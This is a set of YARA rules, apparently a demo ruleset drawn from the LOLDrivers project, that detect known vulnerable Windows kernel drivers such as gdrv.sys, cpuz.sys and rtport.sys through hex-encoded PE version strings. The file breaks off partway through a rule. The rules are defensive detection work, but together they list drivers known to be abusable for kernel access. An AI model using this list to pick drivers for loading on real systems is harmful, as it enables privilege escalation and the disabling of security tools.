PUA_VULN_Driver_Gigabytetechnologycoltd_Gdrvsys_Gigabytesoftwaredriver_133E_RID4451 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - gdrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 02:48:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0047004900470041002d00420059005400450020004e006f006e0050006e00500020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0047004900470041002d004200590054004500200054004500430048004e004f004c004f0047005900200043004f002e002c0020004c00540044002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0031002e0033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0047004900470041002d004200590054004500200053006f0066007400770061007200650020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310037 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Ngiodriversys_Avastng_1072_RID3C62 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ngiodriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:09:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0061007600610073007400210020004e0047002000730065007400750070002000680065006c0070006500720020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0030002e0030002e0031003100320036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0030002e0030002e0031003100320036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0061007600610073007400210020004e0047 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003200200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Cpuid_Cpuzsys_Cpuidservice_8A07_RID389E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - cpuz.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 18:28:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004300500055004900440020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00430050005500490044 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e003100360033003800350020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e00310036003300380035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043005000550049004400200073006500720076006900630065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400280043002900200032003000310033002000430050005500490044 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Cpuid_Cpuzsys_Cpuidservice_0D37_RID389C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - cpuz.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 18:28:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004300500055004900440020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00430050005500490044 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e003100360033003800350020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e00310036003300380035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043005000550049004400200073006500720076006900630065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400280043002900200032003000310030002000430050005500490044 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Proxydrvsys_Nn_C0E7_RID33FB : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ProxyDrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 15:11:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]96f7795e004e004e52a0901f5668002d9a7152a87a0b5e8f65874ef6 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]96f7795eff086b666c49ff097f517edc6280672f67099650516c53f8 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c0039002c0035002c0033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0035002e0031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00500072006f00780079004400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]96f7795e004e004e52a0901f5668 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00500072006f00780079004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000400020005700770077002e004e006e002e0043006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_5381_RID369A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nscm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:02:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c002000580054006900650072002000530065007300730069006f006e0020004d0061006e0061006700650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e0036002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e0036 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00730063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310031002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Netfiltersys_26D6_RID3312 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - netfilter2.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:32:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570059004a00530051002000540044004900200048006f006f006b0020004400720069007600650072002000280057005000500029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]5b8f56fe65e05fe7 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0034002e0039002e00350020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0035002e0038002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0065007400660069006c0074006500720032002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]65e05fe752a0901f5668 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0065007400660069006c0074006500720032002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9002000770079006a00730071002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Asustek_Driversys_Ectool_927C_RID37D8 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - driver7-x86-withoutdbg.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:55:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400680065002000640072006900760065007200200066006f007200200074006800650020004500430074006f006f006c0020006400720069007600650072002d0062006100730065006400200074006f006f006c0073 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004100530055005300740065006b } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0035002e0030002e0032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0044007200690076006500720037002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0045004300200074006f006f006c } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0044007200690076006500720037 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmelsys_Trendmicroearlylaunchantimalwaredriver_DD62_RID46E4 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - Tmel.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:37:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200045004c0041004d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e0030002e0031003000300032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0065006c002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f0020004500610072006c00790020004c00610075006e0063006800200041006e00740069002d004d0061006c00770061007200650020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0065006c002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100350020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Intelcorp_Stdcdrvwssys_Selftestdatacollectordriverforwindowsx_70AF_RID47A4 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - stdcdrvws64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:09:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530065006c006600540065007300740020004400610074006100200043006f006c006c006500630074006f00720020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e00740065006c00200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0031002e00300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00730074006400630064007200760077007300360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00530065006c006600540065007300740020004400610074006100200043006f006c006c006500630074006f0072002000440072006900760065007200200066006f0072002000570069006e0064006f00770073002000370020007800360034 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00730074006400630064007200760077007300360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200032003000310030 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realteksemiconductorcorp_Rtportsys_Realtekportio_FF32_RID421D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtport.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:14:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200450041004c00540045004b00200050006f0072007400200049002f004f } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200450041004c00540045004b002000530065006d00690063006f006e0064007500630074006f007200200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e00300031002e0030003000300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e00300031002e0030003000300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]005200540050004f00520054002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005200450041004c00540045004b00200050006f0072007400200049002f004f } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]005200540050004f00520054002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280063002900200031003900390039002d00320030003000310020005200450041004c00540045004b002000530065006d00690063006f006e0064007500630074006f007200200043006f00720070002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realtek_Rtkiosys_Realtekiodriver_A6F7_RID3B32 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtkio.sys, rtkio64.sys, rtkiow8x64.sys, rtkiow10x64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:18:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200650061006c00740065006b00200049004f004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200650061006c00740065006b00200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003000300031002e0030003700320035002e00320030003100320020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e003000300031002e0030003700320035002e0032003000310032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00720074006b0069006f00360034002e0073007900730020 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005200650061006c00740065006b00200049004f0044007200690076006500720020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00720074006b0069006f00360034002e0073007900730020 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100320020005200650061006c00740065006b002000530065006d00690063006f006e0064007500630074006f007200200043006f00720070006f0072006100740069006f006e002e00200041006c006c002000520069006700680074002000520065007300650072007600650064002e002000200020002000200020002000200020002000200020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_834A_RID36A9 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - libnicm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:05:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c0020005800540043004f004d0020005300650072007600690063006500730020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e00310030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e00310030 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006c00690062006e00690063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310032002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Asustekcomputerinc_Eiosys_Asusvgakernelmodedriver_F4C7_RID4267 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - EIO.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:26:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004100530055005300200056004700410020004b00650072006e0065006c0020004d006f006400650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004100530055005300540065004b00200043006f006d0070007500740065007200200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00390037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00390037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00450049004f002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100530055005300200056004700410020004b00650072006e0065006c0020004d006f006400650020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00450049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000320030003000340020004100530055005300540065004b00200043006f006d0070007500740065007200200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_F42E_RID3BC6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:43:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f00770073002000780036003400200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200032002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003900200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Msi_Ntiolibsys_Ntiolib_CF4B_RID370B : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NTIOLib.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:21:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00540049004f004c0069006200200066006f00720020004d005300490043006c006f0063006b005f00430043 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00530049 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00540049004f004c00690062 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300038002d00320030003000390020004d00530049002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Computerzsys_Ludashisystemdriver_3867_RID3B7E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:31:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0033002e00310030002e003800300032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0033002e00310030002e003800300032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300038002d00320030003100300020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_D783_RID3DB2 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:05:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00350030002e0030002e0031003000330033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00350030 } \n      $ = { 